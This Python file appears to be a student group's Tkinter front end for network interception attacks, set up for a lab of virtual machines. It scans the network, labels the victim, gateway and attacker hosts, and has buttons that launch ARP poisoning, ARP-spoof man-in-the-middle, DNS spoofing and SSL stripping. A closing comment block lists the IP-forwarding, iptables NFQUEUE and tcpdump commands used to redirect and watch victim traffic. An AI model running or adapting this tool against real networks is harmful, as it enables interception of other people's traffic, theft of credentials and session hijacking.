import arp_poison
import dns_spoof
import arp_mitm_gateway
import recon
import os
import sys
import threading
import ssl_strip
import Tkinter as tk
import time

def main():

    os.system("clear")
    print("Hold on, Scanning Network...")
    interfaces = recon.list_interfaces()

    interfaceLAN = interfaces[1]
    interfaceNAT = interfaces[2]

    ipAttackerLAN = recon.get_own_ip_mac_adress(interfaceLAN)['ipAttacker']
    macAttackerLAN = recon.get_own_ip_mac_adress(interfaceLAN)['macAttacker']

    ipAttackerNAT = recon.get_own_ip_mac_adress(interfaceNAT)['ipAttacker']
    macAttackerNAT = recon.get_own_ip_mac_adress(interfaceNAT)['macAttacker']

    ipGateway = recon.get_gateway()['ipGateway']
    macGateway = recon.get_gateway()['macGateway']

    devicesListNAT = recon.scan_network(interfaceNAT)
    ipVictimNAT = devicesListNAT[3]['ip']
    macVictimNAT = devicesListNAT[3]['mac']

    devicesListLAN = recon.scan_network(interfaceLAN)
    ipVictimLAN = devicesListLAN[0]['ip']
    macVictimLAN = devicesListLAN[0]['mac']
    ipServerLAN = devicesListLAN[1]['ip']
    macServerLAN = devicesListLAN[1]['mac']

    win = tk.Tk()
    win.geometry("800x600")
    win.title("Group 36 Tool")
    win.resizable(False, False)
    
    labelIPVLAN = tk.Label(win, text="Target IP LAN(M1): {}".format(ipVictimLAN))
    labelIPVLAN.pack()

    labelIPGateLAN = tk.Label(win, text="Gateway(Server) LAN IP (M2): {}".format(ipServerLAN))
    labelIPGateLAN.pack()

    labelIPAttLAN = tk.Label(win, text="Attacker IP (M3) LAN: {}".format(ipAttackerLAN))
    labelIPAttLAN.pack()

    labelIPVNAT = tk.Label(win, text="Target IP NAT(M1): {}".format(ipVictimNAT))
    labelIPVNAT.pack()

    labelIPGateNAT = tk.Label(win, text="Gateway NAT IP (M2): {}".format(ipGateway))
    labelIPGateNAT.pack()

    labelIPAttNAT = tk.Label(win, text="Attacker IP (M3) NAT: {}".format(ipAttackerNAT))
    labelIPAttNAT.pack()

    menu = tk.Menu(win)
    win.config(menu=menu)

    def changeTargetLAN():
        popup = tk.Toplevel(win)
        popup.geometry("200x200")
        popup.title("Change Target IP LAN")
        popup.resizable(False, False)   

        ip = tk.StringVar()
        mac = tk.StringVar()

        def changeIP():
            ipVictimLAN = ip.get()
            macVictimLAN = mac.get()
            labelIPVLAN.configure(text="Target IP LAN(M1): {}".format(ip.get()))
            popup.destroy()
            
        entryIP = tk.Entry(popup, textvariable=ip)
        entryIP.pack()

        entryMAC = tk.Entry(popup, textvariable=mac)
        entryMAC.pack()


        tk.Label(win, text="MAC format = ff:ff:ff:ff:ff:ff").pack()
        button = tk.Button(popup, text="Change", command=changeIP)
        button.pack(pady=10)

    def changeGateLAN():
        popup = tk.Toplevel(win)
        popup.geometry("200x200")
        popup.title("Change Gateway IP LAN")
        popup.resizable(False, False)   

        ip = tk.StringVar()
        mac = tk.StringVar()

        def changeIP():
            ipServerLAN = ip.get()
            macServerLAN = mac.get()
            labelIPGateLAN.configure(text="Gateway(Server) LAN IP (M2): {}".format(ip.get()))
            popup.destroy()
            
        entryIP = tk.Entry(popup, textvariable=ip)
        entryIP.pack()

        entryMAC = tk.Entry(popup, textvariable=mac)
        entryMAC.pack()


        tk.Label(win, text="MAC format = ff:ff:ff:ff:ff:ff").pack()
        button = tk.Button(popup, text="Change", command=changeIP)
        button.pack(pady=10)

    def changeAttLAN():
        popup = tk.Toplevel(win)
        popup.geometry("200x200")
        popup.title("Change Gateway IP LAN")
        popup.resizable(False, False)   

        ip = tk.StringVar()
        mac = tk.StringVar()

        def changeIP():
            ipAttackerLAN = ip.get()
            macAttackerLAN = mac.get()
            labelIPAttLAN.configure(text="Attacker IP (M3) LAN: {}".format(ip.get()))
            popup.destroy()
            
        entryIP = tk.Entry(popup, textvariable=ip)
        entryIP.pack()

        entryMAC = tk.Entry(popup, textvariable=mac)
        entryMAC.pack()


        tk.Label(win, text="MAC format = ff:ff:ff:ff:ff:ff").pack()
        button = tk.Button(popup, text="Change", command=changeIP)
        button.pack(pady=10)
    
    def changeTargetNAT():
        popup = tk.Toplevel(win)
        popup.geometry("200x200")
        popup.title("Change Gateway IP LAN")
        popup.resizable(False, False)   

        ip = tk.StringVar()
        mac = tk.StringVar()

        def changeIP():
            ipVictimNAT = ip.get()
            macVictimNAT = mac.get()
            labelIPVNAT.configure(text="Target IP NAT(M1): {}".format(ip.get()))
            popup.destroy()
            
        entryIP = tk.Entry(popup, textvariable=ip)
        entryIP.pack()

        entryMAC = tk.Entry(popup, textvariable=mac)
        entryMAC.pack()


        tk.Label(win, text="MAC format = ff:ff:ff:ff:ff:ff").pack()
        button = tk.Button(popup, text="Change", command=changeIP)
        button.pack(pady=10)

    def changeGateNAT():
        popup = tk.Toplevel(win)
        popup.geometry("200x200")
        popup.title("Change Gateway IP LAN")
        popup.resizable(False, False)   

        ip = tk.StringVar()
        mac = tk.StringVar()

        def changeIP():
            ipGateway = ip.get()
            macGateway = mac.get()
            labelIPGateNAT.configure(text="Gateway NAT IP (M2): {}".format(ip.get()))
            popup.destroy()
            
        entryIP = tk.Entry(popup, textvariable=ip)
        entryIP.pack()

        entryMAC = tk.Entry(popup, textvariable=mac)
        entryMAC.pack()


        tk.Label(win, text="MAC format = ff:ff:ff:ff:ff:ff").pack()
        tk.Label(win, text="Not recommended to change this").pack()
        button = tk.Button(popup, text="Change", command=changeIP)
        button.pack(pady=10)

    def changeAttNAT():
        popup = tk.Toplevel(win)
        popup.geometry("200x200")
        popup.title("Change Gateway IP LAN")
        popup.resizable(False, False)   

        ip = tk.StringVar()
        mac = tk.StringVar()

        def changeIP():
            ipAttackerNAT = ip.get()
            macAttackerNAT = mac.get()
            labelIPAttNAT.configure(text="Attacker IP (M3) NAT: {}".format(ip.get()))
            popup.destroy()
            
        entryIP = tk.Entry(popup, textvariable=ip)
        entryIP.pack()

        entryMAC = tk.Entry(popup, textvariable=mac)
        entryMAC.pack()


        tk.Label(win, text="MAC format = ff:ff:ff:ff:ff:ff").pack()
        button = tk.Button(popup, text="Change", command=changeIP)
        button.pack(pady=10)


    def showList():
        popup = tk.Toplevel(win)
        popup.geometry("500x500")
        popup.title("Devices")
        popup.resizable(False, False) 


        tk.Label(popup, text="LAN Devices").pack()
        for entry in devicesListLAN: 
            tk.Label(popup, text=str(entry)).pack()

        tk.Label(popup, text="NAT Devices").pack()
        for entry in devicesListNAT: 
            tk.Label(popup, text=str(entry)).pack()

        



    changeMenu = tk.Menu(menu)
    changeMenu.add_command(label="Change Target Details (LAN)", command=changeTargetLAN)
    changeMenu.add_command(label="Change Gateway Details (LAN)", command=changeGateLAN)
    changeMenu.add_command(label="Change Attacker Details (LAN)", command=changeAttLAN)
    changeMenu.add_command(label="Change Target Details (NAT)", command=changeTargetNAT)
    changeMenu.add_command(label="Change Gateway Details (NAT)", command=changeGateNAT)
    changeMenu.add_command(label="Change Attacker Details (NAT)", command=changeAttNAT)
    changeMenu.add_command(label="View Device List", command=showList)
    menu.add_cascade(label="Change Details", menu=changeMenu)


        

    def dns():
        print("MITM Activated")
        gatewayspoof = threading.Thread(target=arp_mitm_gateway.spoof, args=(ipGateway, ipAttackerNAT, ipVictimNAT, macGateway, macAttackerNAT, macVictimNAT, interfaceNAT))
        print("DNS Spoofing")
        dnsthread = threading.Thread(target=dns_spoof.dns_spoof)
        gatewayspoof.start()
        dnsthread.start()
        gatewayspoof.join()
        dnsthread.join()

    def arpPoison():
        arp_poison.arp_poison(ipVictimLAN, macVictimLAN, ipServerLAN, macAttackerLAN, interfaceLAN)
    def arpListen():
        arp_poison.arp_listener(macAttackerLAN, interfaceLAN)
    def arpGateway(checked):
        arp_mitm_gateway.spoof(ipGateway, ipAttackerNAT, ipVictimNAT, macGateway, macAttackerNAT, macVictimNAT, interfaceNAT, checked)

    def ssl():
        print("MITM Activated")
        gatewayspoof = threading.Thread(target=arp_mitm_gateway.spoof, args=("10.0.2.12", ipAttackerNAT, ipVictimNAT, "08:00:27:0B:4D:33", macAttackerNAT, macVictimNAT, interfaceNAT))
        print("SSL Stripping")
        sslthread = threading.Thread(target=ssl_strip.start)
        
        gatewayspoof.start()
        sslthread.start()
        gatewayspoof.join()
        sslthread.join()



    def exit():
        win.destroy()
        sys.exit()
        quit()

    

    arpButton = tk.Button(win, text="ARP Poison Target", command=arpPoison)
    arpButton.pack(pady=10)
    arpListener = tk.Button(win, text="ARP Listener (MITM LAN)", command=arpListen)
    arpListener.pack(pady=10)
    arpMITM = tk.Button(win, text="ARP Spoof (MITM NAT)", command=arpGateway)
    arpMITM.pack(pady=10)
    dnsButton = tk.Button(win, text="DNS Spoof", command=dns)
    dnsButton.pack(pady=10)
    sslButton = tk.Button(win, text="SSL Strip", command=ssl)
    sslButton.pack(pady=10)
    win.protocol("WM_DELETE_WINDOW", exit)
    


    win.mainloop()

if __name__ == "__main__":
    main()






'''
    print(interfaceNAT) # enp0s8
    print(interfaceLAN) # enp0s3

# make sure that IP forwarding is enabled on the attacker machine (M3). 
This can be done by modifying the system configuration using the following command:
sudo echo 1 > /proc/sys/net/ipv4/ip_forward

Before running this script, you need to set up iptables to redirect packets to the NetfilterQueue
sudo iptables -I FORWARD -j NFQUEUE --queue-num 0 


# ps aux | grep python
# sudo kill -9 <pid>
# sudo iptables --flush
# sudo iptables -t nat --flush

use tcpdump to filter traffic by port and host:

sudo tcpdump -i enp0s8 -n port 80
sudo tcpdump -i enp0s8 -n host 10.0.2.9
sudo tcpdump -i enp0s8 -n port 80 and host 10.0.2.9


'''





